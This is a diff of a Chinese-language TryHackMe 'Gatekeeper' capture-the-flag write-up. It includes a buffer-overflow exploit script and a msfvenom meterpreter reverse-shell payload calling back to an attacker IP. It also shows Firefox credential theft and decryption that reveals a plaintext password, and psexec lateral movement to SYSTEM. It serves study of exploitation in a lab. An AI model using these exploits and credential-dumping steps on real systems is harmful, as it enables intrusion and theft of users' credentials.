@@ -4,10 +4,10 @@
 # 服务探测
 ```
 ┌──(root💀kali)-[~/tryhackme/Gatekeeper]
-└─# nmap -sV -Pn 10.10.157.221 
+└─# nmap -sV -Pn 10.10.97.198 
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-23 00:58 EST
-Nmap scan report for 10.10.157.221
+Nmap scan report for 10.10.97.198
 Host is up (0.33s latency).
 Not shown: 991 closed ports
 PORT      STATE SERVICE      VERSION
@@ -51,8 +51,8 @@ Nmap done: 1 IP address (1 host up) scanned in 205.24 seconds
 用```smbmap```探测```anonymous```能过访问的分享文件夹
 ```
 ┌──(root💀kali)-[~/tryhackme/Gatekeeper]
-└─# smbmap -H 10.10.157.221 -u anonymous
-[+] Guest session       IP: 10.10.157.221:445    Name: 10.10.157.221                                      
+└─# smbmap -H 10.10.97.198 -u anonymous
+[+] Guest session       IP: 10.10.97.198:445    Name: 10.10.97.198                                      
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         ADMIN$                                                  NO ACCESS       Remote Admin
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 205.24 seconds
 
 ```
 ┌──(root💀kali)-[~/tryhackme/Gatekeeper]
-└─# smbclient //10.10.157.221/Users     
+└─# smbclient //10.10.97.198/Users     
 Enter WORKGROUP\root's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -93,7 +93,11 @@ smb: \share\> ls
 
 # 缓冲区溢出攻击
 
-Fuzzing!
+## Fuzzing!
+因为要反复测试验证缓冲区溢出，我们需要另外一个windows的靶机，这边准备了一个win7的靶机，在上面安装了```Immunity Debugger```程序，关于```Immunity Debugger```的使用在这里不再多做介绍。
+win7靶机的内网IP是:```192.168.3.49```
+
+在kali准备以下FUZZY脚本：
 ```
 #!/usr/bin/python
 import sys, socket
@@ -124,7 +128,7 @@ finally:
 
 ```
 
-在发送300个字节时，靶机程序奔溃。
+运行fuzzy.py，在发送300个字节时，靶机程序奔溃。
 ![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/fuzz.png "fuzz")
 
 ## 计算EIP位置
@@ -140,7 +144,7 @@ finally:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
 ```
 
-使用下面脚本进行攻击：
+使用下面脚本```exploit1.py```进行攻击，把上面生成的串放到payload：
 ```
 #coding=utf-8
 #!/usr/bin/python
@@ -175,6 +179,8 @@ except:
 
 EIP地址：65413565
 
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/EIP%E5%9C%B0%E5%9D%80.png "EIP")
+
 
 计算出EIP的偏移量
 
@@ -192,6 +198,8 @@ EIP地址：65413565
 ## 查找坏字节
 
 我们在Immunity Debugger中输入：```!mona bytearray -b "\x00"```
+
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/%E6%9F%A5%E6%89%BE%E5%9D%8F%E5%AD%97%E8%8A%821.png "b1")
 
 0x00在C/C++语言中表示终止，所以是一个很普遍的坏字节，在上面我们首先把它排除掉。
 我们用下面的bytearray.py脚本生成所有字节码：
@@ -246,24 +254,37 @@ except:
 我们可以查看到EIP的值，此时已经变成了42424242，42在ASCII里就是大写的B，也就是我们上面的exploit.py里面retn的值，此时已证明可以覆盖到EIP。
 
 
-另外，记住这里ESP的值是：003719F8
+另外，记住这里ESP的值是：004619f9
 
-我们执行```!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 003719F8```
+
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/ESP.png "ESP")
+
+我们执行```!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 004619f9```
 
 
 得到一个可能的坏字节的序列:
 ```POSSIBLY BAD CHARS:01 0a```
 
 
-!mona bytearray -b "\x00\x01\x0a"
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/%E6%9F%A5%E6%89%BE%E5%9D%8F%E5%AD%97%E8%8A%822.png "b2")
 
 
-!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 004819F8
+执行：
+> !mona bytearray -b "\x00\x01\x0a"
 
-004819F8
+
+> !mona compare -f C:\mona\gatekeeper\bytearray.bin -a 004819F8
+
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/%E6%9F%A5%E6%89%BE%E5%9D%8F%E5%AD%97%E8%8A%823.png "b3")
 
 
-!mona jmp -r esp -cpb "\x00\x01\x0a"
+现在我们已经找到了所有坏字节：```\x00\x01\x0a```
+
+## 找shellcode
+
+> !mona jmp -r esp -cpb "\x00\x01\x0a"
+
+![alt 属性文本](https://github.com/maxzxc0110/hack-study/blob/main/img/shellcode%E5%9C%B0%E5%9D%80.png "shellcode")
 
 有两个地址，我们选择第一个：080414c3
 
@@ -390,9 +411,11 @@ C:\Users\max\Desktop>
 
 ```
 
+到此为止，我们在本地靶机成功验证gatekeeper.exe存在一个缓冲区溢出漏洞。
+
 # 正式攻击
 
-为了后续渗透提权比较简单，我们的payload换成了meterpreter
+为了后续渗透提权方便，我们的payload换成了meterpreter
 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.21.169  LPORT=4444 EXITFUNC=thread -b "\x00\x01\x0a" -f c
 
 ```
@@ -438,12 +461,12 @@ unsigned char buf[] =
 
 ```
 
-把上面生成的payload赋值复制到下面攻击脚本，把ip地址改成远程靶机地址，保存为exploit4.py
+把上面生成的payload复制到下面攻击脚本，把ip地址改成远程靶机地址，保存为exploit4.py
 
 ```
 import socket
 
-ip = "10.10.157.221"
+ip = "10.10.97.198"
 port = 31337
 
 prefix = "OVERFLOW1 "
@@ -504,8 +527,8 @@ except:
 msf6 exploit(multi/handler) > run
 
 [*] Started reverse TCP handler on 10.13.21.169:4444 
-[*] Sending stage (175174 bytes) to 10.10.157.221
-[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.157.221:49219) at 2021-11-24 04:18:57 -0500
+[*] Sending stage (175174 bytes) to 10.10.97.198
+[*] Meterpreter session 1 opened (10.13.21.169:4444 -> 10.10.97.198:49219) at 2021-11-24 04:18:57 -0500
 
 meterpreter > getuid
 Server username: GATEKEEPER\natbat
@@ -517,8 +540,124 @@ The buffer overflow in this room is credited to Justin Steven and his
 ```
 
 
+# 提权
+
+我们使用```windows/gather/enum_applications```模块列出靶机安装的软件信息
+
+```
+meterpreter > run post/windows/gather/enum_applications 
+                                                                                                                                                                          
+[*] Enumerating applications installed on GATEKEEPER                                                                                                                      
+
+Installed Applications
+======================
+
+ Name                                                                Version
+ ----                                                                -------
+ Amazon SSM Agent                                                    2.3.842.0
+ Amazon SSM Agent                                                    2.3.842.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ EC2ConfigService                                                    4.9.4222.0
+ Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.20.27508  14.20.27508.1
+ Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
+ Microsoft Visual C++ 2019 X86 Additional Runtime - 14.20.27508      14.20.27508
+ Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
+ Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.20.27508         14.20.27508
+ Mozilla Firefox 75.0 (x86 en-US)                                    75.0
+
+```
 
 
+看到靶机安装了Firefox浏览器，我们继续用```post/multi/gather/firefox_creds```尝试模块导出浏览器上可能的登录凭证，此模块可以枚举出firefox存储的用户信息。
 
+```
+meterpreter > run post/multi/gather/firefox_creds 
 
+[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
+[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\
+
+[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+[+] Downloaded cert9.db: /root/.msf4/loot/20211124083259_default_10.10.97.198_ff.ljfn812a.cert_093945.bin
+[+] Downloaded cookies.sqlite: /root/.msf4/loot/20211124083301_default_10.10.97.198_ff.ljfn812a.cook_335589.bin
+[+] Downloaded key4.db: /root/.msf4/loot/20211124083306_default_10.10.97.198_ff.ljfn812a.key4_584356.bin
+[+] Downloaded logins.json: /root/.msf4/loot/20211124083310_default_10.10.97.198_ff.ljfn812a.logi_811634.bin
+
+[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default
+
+```
  
+
+ 用strings命令查看最后一条含有login字样的文件：
+ ```
+ └─# strings /root/.msf4/loot/20211124083310_default_10.10.97.198_ff.ljfn812a.logi_811634.bin                                                                         12 ⨯
+
+{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
+
+ ```
+
+ 上面看见有加密的Username和Password
+
+ 我们用[这个脚本](https://github.com/unode/firefox_decrypt)导出加密用户凭证，需要注意上面导出的文件夹要分别改成对应的文件名字
+
+```
+ ┌──(root💀kali)-[~/tryhackme/Gatekeeper/firefox_decrypt]
+└─# mv /root/.msf4/loot/20211124083259_default_10.10.97.198_ff.ljfn812a.cert_093945.bin /root/.msf4/lootcert9.db 
+                                                                                                                                                                                                                                                                                                                             
+┌──(root💀kali)-[~/tryhackme/Gatekeeper/firefox_decrypt]
+└─# mv /root/.msf4/loot/20211124083301_default_10.10.97.198_ff.ljfn812a.cook_335589.bin /root/.msf4/loot/cookies.sqlite
+                                                                                                                                                                                                                                                                                                                             
+┌──(root💀kali)-[~/tryhackme/Gatekeeper/firefox_decrypt]
+└─# mv /root/.msf4/loot/20211124083306_default_10.10.97.198_ff.ljfn812a.key4_584356.bin /root/.msf4/loot/key4.db       
+                                                                                                                                                                                                                                                                                                                             
+┌──(root💀kali)-[~/tryhackme/Gatekeeper/firefox_decrypt]
+└─# mv /root/.msf4/loot/20211124083310_default_10.10.97.198_ff.ljfn812a.logi_811634.bin /root/.msf4/loot/logins.json
+```
+
+执行脚本，导出用户凭证
+```
+┌──(root💀kali)-[~/tryhackme/Gatekeeper/firefox_decrypt]
+└─# python3 firefox_decrypt.py /root/.msf4/loot/                                                      
+2021-11-24 09:25:29,014 - WARNING - profile.ini not found in /root/.msf4/loot/
+2021-11-24 09:25:29,015 - WARNING - Continuing and assuming '/root/.msf4/loot/' is a profile location
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
+```
+
+使用psexec.py
+```
+┌──(root💀kali)-[~/tryhackme/Gatekeeper]
+└─# locate psexec.py      
+/usr/share/doc/python3-impacket/examples/psexec.py
+/usr/share/set/src/fasttrack/psexec.py
+```
+
+登录```mayor```的账号，拿到root.txt
+
+```
+┌──(root💀kali)-[~/tryhackme/Gatekeeper]
+└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py mayor@10.10.97.198                                                                                                                                                                                                                                        1 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.10.97.198.....
+[*] Found writable share ADMIN$
+[*] Uploading file fLGVcyVU.exe
+[*] Opening SVCManager on 10.10.97.198.....
+[*] Creating service lccL on 10.10.97.198.....
+[*] Starting service lccL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+c:\Users\mayor\Desktop>type c:\Users\mayor\Desktop\root.txt.txt
+{逗你玩儿~}
+```
